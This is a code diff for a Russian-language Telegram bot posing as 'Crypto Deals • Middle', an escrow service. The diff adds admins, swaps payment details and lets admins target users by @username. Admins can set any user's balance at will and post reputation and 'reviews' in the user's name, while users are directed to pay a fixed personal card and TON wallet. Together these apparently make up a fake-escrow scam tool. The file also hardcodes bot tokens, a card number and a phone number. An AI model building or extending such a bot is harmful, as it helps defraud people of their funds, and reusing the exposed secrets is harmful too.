@@ -6,14 +6,14 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.filters import Command
 
-BOT_TOKEN = "8676951864:AAGNxc_bfdkBER0n8jh-8RrhlZKQj-ajyHs"
-ADMIN_ID = 174415647
+BOT_TOKEN = "8372953278:AAFEHQTV0zfyynXdJreIm_pyNnBuxp6Em2w"
+ADMIN_IDS = [174415647, 7321459420]
 
 MIDDLE_USERNAME = "@CryptoDeal_Middle"
 SUPPORT_USERNAME = "@CryptoDeal_Escrow"
 TON_ADDRESS = "UQBu7JOWQIU72kp4r2TG45925P5Rg1qz5wzurEWmC5lWZbTL"
 CARD_NUMBER = "2200702126310668"
-PHONE_NUMBER = "89047262947"
+CARD_BANK = "Озон Банк | +79011716762"
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
@@ -51,10 +51,24 @@ class AdminAction(StatesGroup):
     balance = State()
     review = State()
 
+# username -> uid mapping (populated on every user message)
+username_map = {}  # "username_lowercase" -> uid
+
+def find_uid(query: str):
+    """Find UID by @username or numeric ID"""
+    q = query.strip()
+    if q.startswith("@"):
+        return username_map.get(q[1:].lower())
+    try:
+        uid = int(q)
+        return uid if uid in user_data else None
+    except ValueError:
+        return None
+
 # ===================== TEXTS =====================
 WELCOME_TEXT = (
     "Добро пожаловать 👋\n\n"
-    "💼 <b>Crypto Deals</b> - Мы специализированный сервис по обеспечению безопасности вне биржевых сделок.\n\n"
+    "💼 <b>Crypto Deals • Middle</b> - Мы специализированный сервис по обеспечению безопасности вне биржевых сделок.\n\n"
     "✨ Автоматизированный алгоритм исполнения.\n"
     "⚡️ Скорость и автоматизация.\n"
     "💳 Удобный и быстрый вывод средств.\n\n"
@@ -82,7 +96,7 @@ AGREEMENT_TEXT = (
     "☑️ <b>Пользовательское соглашение</b>\n\n"
     "🛡️ Для обеспечения сохранности ваших активов строго соблюдайте установленный регламент:\n\n"
     "<b>• Депонирование активов:</b>\n"
-    f"Передача активов осуществляется исключительно через официальный контакт: <b>{SUPPORT_USERNAME}</b>\n\n"
+    f"Передача активов осуществляется исключительно через официальный контакт: <b>{MIDDLE_USERNAME}</b>\n\n"
     "<b>• Запрет прямых расчетов:</b>\n"
     "Категорически запрещено отправлять средства или товары напрямую покупателю/продавцу.\n\n"
     "<b>• Завершение сделки:</b>\n"
@@ -182,9 +196,16 @@ async def show_menu(message: Message):
 # ===================== /START =====================
 @dp.message(Command("start"))
 async def cmd_start(message: Message):
-    get_user(message.from_user.id)
+    uid = message.from_user.id
+    get_user(uid)
+    if message.from_user.username:
+        username_map[message.from_user.username.lower()] = uid
     await safe_delete(message)
     await show_menu(message)
+
+def _reg(msg: Message):
+    if msg.from_user and msg.from_user.username:
+        username_map[msg.from_user.username.lower()] = msg.from_user.id
 
 # ===================== MENU =====================
 @dp.callback_query(F.data == "menu")
@@ -223,6 +244,7 @@ async def cb_confirm(callback: CallbackQuery, state: FSMContext):
 
 @dp.message(Deal.description)
 async def deal_desc(message: Message, state: FSMContext):
+    _reg(message)
     await safe_delete(message)
     await state.update_data(description=message.text)
     await message.answer(
@@ -233,6 +255,7 @@ async def deal_desc(message: Message, state: FSMContext):
 
 @dp.message(Deal.amount)
 async def deal_amt(message: Message, state: FSMContext):
+    _reg(message)
     await safe_delete(message)
     await state.update_data(amount=message.text)
     await message.answer(
@@ -285,10 +308,13 @@ async def deal_cur(callback: CallbackQuery, state: FSMContext):
     await callback.message.answer(deal_text, parse_mode="HTML", reply_markup=back_kb())
 
     uname = f"@{callback.from_user.username}" if callback.from_user.username else f"ID: {uid}"
-    await bot.send_message(ADMIN_ID,
-        f"🆕 <b>Новая сделка {deal_id}</b>\n\n👤 {uname} | ID: {uid}\n"
-        f"📋 {data.get('description','—')}\n💵 {data.get('amount','—')}\n💱 {cur_label}",
-        parse_mode="HTML")
+    for admin_id in ADMIN_IDS:
+        await bot.send_message(
+            admin_id,
+            f"🆕 <b>Новая сделка {deal_id}</b>\n\n👤 {uname} | ID: {uid}\n"
+            f"📋 {data.get('description','—')}\n💵 {data.get('amount','—')}\n💱 {cur_label}",
+            parse_mode="HTML"
+        )
     await state.clear()
     await callback.answer()
 
@@ -343,6 +369,7 @@ async def cb_req_stars(callback: CallbackQuery, state: FSMContext):
 @dp.message(AddReq.ton)
 async def save_ton(message: Message, state: FSMContext):
     uid = message.from_user.id
+    _reg(message)
     get_user(uid).update({"ton_wallet": message.text, "has_requisites": True})
     data = await state.get_data()
     await safe_delete(message)
@@ -353,6 +380,7 @@ async def save_ton(message: Message, state: FSMContext):
 @dp.message(AddReq.card)
 async def save_card(message: Message, state: FSMContext):
     uid = message.from_user.id
+    _reg(message)
     get_user(uid).update({"card": message.text, "has_requisites": True})
     data = await state.get_data()
     await safe_delete(message)
@@ -363,6 +391,7 @@ async def save_card(message: Message, state: FSMContext):
 @dp.message(AddReq.stars)
 async def save_stars(message: Message, state: FSMContext):
     uid = message.from_user.id
+    _reg(message)
     get_user(uid).update({"username_stars": message.text, "has_requisites": True})
     data = await state.get_data()
     await safe_delete(message)
@@ -407,7 +436,7 @@ async def cb_topup_card(callback: CallbackQuery):
     await callback.message.answer(
         f"💳 <b>Пополнение баланса: Банковские карты (РФ)</b>\n\n"
         f"Реквизиты для перевода:\n<code>{CARD_NUMBER}</code>\n"
-        f"Альфа Банк | {PHONE_NUMBER}\n\n"
+        f"{CARD_BANK}\n\n"
         f"• Сохраните чек транзакции.\n"
         f"• Обратитесь в поддержку для подтверждения.\n\n"
         f"⏱ Зачисление: <b>5–15 минут</b>",
@@ -440,19 +469,19 @@ async def cb_withdraw(callback: CallbackQuery):
 # ===================== ADMIN =====================
 @dp.message(Command("adm"))
 async def cmd_adm(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if message.from_user.id not in ADMIN_IDS:
         return
     await safe_delete(message)
     total = len([k for k in user_data if not str(k).startswith("_")])
     await message.answer(
-        f"🔧 <b>Админ-панель | Crypto Deals Middle</b>\n\n"
+        f"🔧 <b>Админ-панель | Crypto Deals • Middle</b>\n\n"
         f"👥 Пользователей: <b>{total}</b>\n"
         f"📋 Сделок: <b>{len(deals)}</b>",
         parse_mode="HTML", reply_markup=admin_kb())
 
 @dp.callback_query(F.data == "adm_banner")
 async def adm_banner(callback: CallbackQuery, state: FSMContext):
-    if callback.from_user.id != ADMIN_ID: return
+    if callback.from_user.id not in ADMIN_IDS: return
     await safe_delete(callback.message)
     await callback.message.answer(
         "📸 Отправьте <b>фото + подпись (caption)</b> одним сообщением для нового баннера.",
@@ -463,7 +492,7 @@ async def adm_banner(callback: CallbackQuery, state: FSMContext):
 
 @dp.message(SetBanner.waiting, F.photo)
 async def save_banner(message: Message, state: FSMContext):
-    if message.from_user.id != ADMIN_ID: return
+    if message.from_user.id not in ADMIN_IDS: return
     user_data["_banner"] = {"photo_id": message.photo[-1].file_id, "caption": message.caption or WELCOME_TEXT}
     await safe_delete(message)
     await message.answer("✅ Баннер обновлён!", reply_markup=admin_kb())
@@ -471,7 +500,7 @@ async def save_banner(message: Message, state: FSMContext):
 
 @dp.callback_query(F.data == "adm_stats")
 async def adm_stats(callback: CallbackQuery):
-    if callback.from_user.id != ADMIN_ID: return
+    if callback.from_user.id not in ADMIN_IDS: return
     total = len([k for k in user_data if not str(k).startswith("_")])
     with_req = len([v for k,v in user_data.items() if not str(k).startswith("_") and isinstance(v,dict) and v.get("has_requisites")])
     active = len([d for d in deals.values() if d.get("status") == "active"])
@@ -486,7 +515,7 @@ async def adm_stats(callback: CallbackQuery):
 
 @dp.callback_query(F.data == "adm_users")
 async def adm_users(callback: CallbackQuery):
-    if callback.from_user.id != ADMIN_ID: return
+    if callback.from_user.id not in ADMIN_IDS: return
     ulist = [k for k in user_data if not str(k).startswith("_")]
     text = f"👥 <b>Пользователи ({len(ulist)})</b>\n\n"
     for uid in ulist[:20]:
@@ -501,9 +530,10 @@ async def adm_users(callback: CallbackQuery):
 
 @dp.callback_query(F.data == "adm_reputation")
 async def adm_rep(callback: CallbackQuery, state: FSMContext):
-    if callback.from_user.id != ADMIN_ID: return
+    if callback.from_user.id not in ADMIN_IDS: return
     await callback.message.answer(
-        "⭐️ <b>Выдача репутации</b>\n\nФормат: <code>USER_ID +5</code> или <code>USER_ID -2</code>",
+        "⭐️ <b>Выдача репутации</b>\n\n"
+        "Формат: <code>@username +5</code> или <code>USER_ID -2</code>",
         parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="adm_cancel")]]))
     await state.set_state(AdminAction.reputation)
@@ -511,24 +541,29 @@ async def adm_rep(callback: CallbackQuery, state: FSMContext):
 
 @dp.message(AdminAction.reputation)
 async def process_rep(message: Message, state: FSMContext):
-    if message.from_user.id != ADMIN_ID: return
+    if message.from_user.id not in ADMIN_IDS: return
     try:
         parts = message.text.strip().split()
-        uid = int(parts[0]); delta = int(parts[1])
+        uid = find_uid(parts[0])
+        if uid is None:
+            await message.answer("❌ Пользователь не найден. Убедитесь что он писал боту.", parse_mode="HTML")
+            await state.clear()
+            return
+        delta = int(parts[1])
         user = get_user(uid)
         user["reputation"] = user.get("reputation", 0) + delta
         new_rep = user["reputation"]
         await message.answer(f"✅ Репутация <code>{uid}</code>: {delta:+}\nИтого: <b>{new_rep} ⭐</b>", parse_mode="HTML")
         await bot.send_message(uid, f"⭐️ Ваша репутация изменена на <b>{delta:+}</b>\nТекущая: <b>{new_rep} ⭐</b>", parse_mode="HTML")
     except Exception:
-        await message.answer("❌ Ошибка. Формат: <code>USER_ID +5</code>", parse_mode="HTML")
+        await message.answer("❌ Ошибка. Формат: <code>@username +5</code> или <code>USER_ID +5</code>", parse_mode="HTML")
     await state.clear()
 
 @dp.callback_query(F.data == "adm_review")
 async def adm_review(callback: CallbackQuery, state: FSMContext):
-    if callback.from_user.id != ADMIN_ID: return
+    if callback.from_user.id not in ADMIN_IDS: return
     await callback.message.answer(
-        "💬 <b>Добавить отзыв</b>\n\nФормат: <code>USER_ID Текст отзыва</code>",
+        "💬 <b>Добавить отзыв</b>\n\nФормат: <code>@username Текст отзыва</code> или <code>USER_ID Текст</code>",
         parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="adm_cancel")]]))
     await state.set_state(AdminAction.review)
@@ -536,23 +571,28 @@ async def adm_review(callback: CallbackQuery, state: FSMContext):
 
 @dp.message(AdminAction.review)
 async def process_review(message: Message, state: FSMContext):
-    if message.from_user.id != ADMIN_ID: return
+    if message.from_user.id not in ADMIN_IDS: return
     try:
         parts = message.text.strip().split(maxsplit=1)
-        uid = int(parts[0]); review_text = parts[1]
+        uid = find_uid(parts[0])
+        if uid is None:
+            await message.answer("❌ Пользователь не найден.", parse_mode="HTML")
+            await state.clear()
+            return
+        review_text = parts[1]
         user = get_user(uid)
         user.setdefault("reviews", []).append(review_text)
         await message.answer(f"✅ Отзыв добавлен пользователю <code>{uid}</code>", parse_mode="HTML")
         await bot.send_message(uid, f"💬 <b>Новый отзыв о вашей сделке:</b>\n\n{review_text}", parse_mode="HTML")
     except Exception:
-        await message.answer("❌ Ошибка. Формат: <code>USER_ID Текст</code>", parse_mode="HTML")
+        await message.answer("❌ Ошибка. Формат: <code>@username Текст</code>", parse_mode="HTML")
     await state.clear()
 
 @dp.callback_query(F.data == "adm_balance")
 async def adm_bal(callback: CallbackQuery, state: FSMContext):
-    if callback.from_user.id != ADMIN_ID: return
+    if callback.from_user.id not in ADMIN_IDS: return
     await callback.message.answer(
-        "💰 <b>Изменить баланс</b>\n\nФормат: <code>USER_ID СУММА</code>\nПример: <code>123456 150.5</code>",
+        "💰 <b>Изменить баланс</b>\n\nФормат: <code>@username СУММА</code> или <code>USER_ID СУММА</code>\nПример: <code>@ivan 150.5</code>",
         parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="adm_cancel")]]))
     await state.set_state(AdminAction.balance)
@@ -560,22 +600,27 @@ async def adm_bal(callback: CallbackQuery, state: FSMContext):
 
 @dp.message(AdminAction.balance)
 async def process_bal(message: Message, state: FSMContext):
-    if message.from_user.id != ADMIN_ID: return
+    if message.from_user.id not in ADMIN_IDS: return
     try:
         parts = message.text.strip().split()
-        uid = int(parts[0]); amount = float(parts[1])
+        uid = find_uid(parts[0])
+        if uid is None:
+            await message.answer("❌ Пользователь не найден.", parse_mode="HTML")
+            await state.clear()
+            return
+        amount = float(parts[1])
         user = get_user(uid)
         old = user.get("balance", 0)
         user["balance"] = amount
         await message.answer(f"✅ Баланс <code>{uid}</code>: {old} → <b>{amount}</b>", parse_mode="HTML")
         await bot.send_message(uid, f"💰 Ваш баланс обновлён: <b>{amount}</b>", parse_mode="HTML")
     except Exception:
-        await message.answer("❌ Ошибка. Формат: <code>USER_ID СУММА</code>", parse_mode="HTML")
+        await message.answer("❌ Ошибка. Формат: <code>@username СУММА</code>", parse_mode="HTML")
     await state.clear()
 
 @dp.callback_query(F.data == "adm_deals")
 async def adm_deals_cb(callback: CallbackQuery):
-    if callback.from_user.id != ADMIN_ID: return
+    if callback.from_user.id not in ADMIN_IDS: return
     if not deals:
         await callback.message.answer("📋 Сделок пока нет.")
         await callback.answer()
